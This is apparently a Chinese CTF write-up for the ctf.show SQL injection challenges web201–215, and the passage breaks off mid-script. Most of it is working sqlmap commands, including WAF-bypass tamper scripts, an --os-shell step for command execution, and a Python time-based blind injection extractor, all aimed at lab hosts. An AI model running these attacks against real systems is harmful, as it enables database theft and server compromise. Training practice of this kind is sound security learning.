<p>使用post方式进行注入，可以直接用<code>--data=&quot;id=1&quot;</code>，也可以<code>--method=post</code>来触发</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1.使用data调整参数
python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot;
2.查库
python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbs
3.查表
python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web --tables
4.查列
python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user --columns
5.查Flag
python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre>

<h4 id="web203-–method-PUT"><a href="#web203-–method-PUT" class="headerlink" title="web203(–method&#x3D;PUT)"></a>web203(–method&#x3D;PUT)</h4><p><strong>HTTP <code>PUT</code> 请求方法</strong>创建一个新的资源或用请求的有效载荷替换目标资源的表示。</p>
<p><code>PUT</code> 与 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> 方法的区别是，<code>PUT</code> 方法是幂等的：调用一次与连续调用多次效果是相同的（即没有<em>副</em>作用），而连续调用多次相同的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> 方法可能会有副作用，比如多次提交同一订单。</p>
<p>指定<code>--method=PUT</code>方法，同时**加上<code>--headers=&quot;Content-Type:text/plain</code>**，否则put接受不了。同时，要加上index.php，<code>url/api/index.php</code></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;6792f785-47eb-4ea4-b098-0123488759c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre>

<h4 id="web204-–cookie"><a href="#web204-–cookie" class="headerlink" title="web204(–cookie)"></a>web204(–cookie)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre>

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql dbs&#x3D;ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre>

<h4 id="web205-api权限"><a href="#web205-api权限" class="headerlink" title="web205(api权限)"></a>web205(api权限)</h4><p>api调用需要鉴权</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span>safe<span class="token operator">-</span>url 设置在测试目标地址前访问的安全链接<span class="token operator">--</span>safe<span class="token operator">-</span>freq 设置两次注入测试前访问安全链接的次数</code></pre>

<p>通过F12中network抓包可以看见，有一个<code>getToken.php</code>的请求token的动作；</p>
<p><img src="web205.png" loading="lazy"></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;bllqt44686hm6msc9ti5ruevpb&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flax -C flagx --dump</code></pre>

<p>这个题换了表名和列名</p>
<h4 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h4><p>sql需要闭合，sqlmap会自动闭合，Payload同上</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;3ehcblk49o3nqd3hp3nqsdr0ga&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</code></pre>

<h4 id="web207-–tamper"><a href="#web207-–tamper" class="headerlink" title="web207(–tamper)"></a>web207(–tamper)</h4><p><a target="_blank" rel="noopener" href="https://y4er.com/posts/sqlmap-tamper/">Sqlmap Tamper 编写</a></p>
<p><code>--batch</code>使用默认的选项进行注入，无需用户输入和交互<br><code>--prefix=PREFIX</code>指定payload的前缀<br><code>--suffix=SUFFIX</code>指定payload的后缀</p>
<p>题目对空格进行了过滤，所以我们可以考虑用space2comment.py这个脚本，将空格转换成注释符来绕过</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --batch --tamper&#x3D;space2comment</code></pre>

<h4 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h4><p>对小写的<code>select</code>和空格进行了绕过，不过sqlmap中的select都是大写的</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> os
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>common <span class="token keyword">import</span> singleTimeWarnMessage
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> DBMS
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHEST
<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
 
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"select"</span><span class="token punctuation">)</span><span class="token comment">#就修改这一行了</span>
    <span class="token keyword">return</span> payload</code></pre>

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --batch --tamper&#x3D;space2comment</code></pre>

<h4 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h4><p>过滤了<code> </code>，<code>*</code>号和<code>=</code>，</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;1763p4504m3dcol5349rfgt5q9&quot; --tamper web209.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch</code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token triple-quoted-string string">"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """</span>

    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x2A</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                <span class="token comment"># retVal += "/**/"</span>
                retVal <span class="token operator">+=</span> char<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal
</code></pre>

<h4 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对查询字符进行解密</span>
  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
      </code></pre>

<p>对传入的id 进行解密处理 从而让sql语句无法执行成功 </p>
<p>按照他的方式 反着构造一个加密脚本 这样传进去后 服务器对id进行一系列操作就变成了 我们想到的id的值了</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;9j6o3g1dvnmvg061n1kbjlruvp&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch</code></pre>

<p><strong>web210.py</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
<span class="token keyword">import</span> base64
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW


<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    retVal <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> retVal

<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

</code></pre>

<h4 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h4><p>过滤了 在web210的基础上过滤了空格 将空格替换成%0a，但是之前脚本依旧可以</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;vueov0jlmgnnbpnr8bgovga6r8&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre>

<h4 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h4><p>多过滤了<code>*</code>，Payload同上</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;4ob2ad7so7hia0pjdds9df53rj&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre>

<h4 id="web213-–os-shell"><a href="#web213-–os-shell" class="headerlink" title="web213(–os-shell)"></a>web213(–os-shell)</h4><p>使用刚才的tamper脚本就行，但是最后使用<code>--os-shell</code>进入shell交互就行</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;mqte5lhv097hu0km2aq9c4qqri&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --os-shell</code></pre>

<h4 id="web214-时间盲注"><a href="#web214-时间盲注" class="headerlink" title="web214(时间盲注)"></a>web214(时间盲注)</h4><p>刷新首页抓包得到注入点(我用https的时候没抓到，http就可以了)</p>
<p><img src="web214.png" loading="lazy"></p>
<p>然后就是进行时间盲注</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://8b0ff336-3094-4316-b708-b0d88f596b52.challenge.ctf.show/api/"</span>
i <span class="token operator">=</span> <span class="token number">0</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        <span class="token comment"># 查库名</span>
        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>
        <span class="token comment"># 查表名  ctfshow_flagx,ctfshow_info</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名  id,flaga,info</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)"</span></span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre>

<h4 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h4><p>使用单引号闭合，后面使用<code>#</code>或者闭合</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://1959b6f7-1317-4f83-a586-f487063f8d90.challenge.ctf.show/api/"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
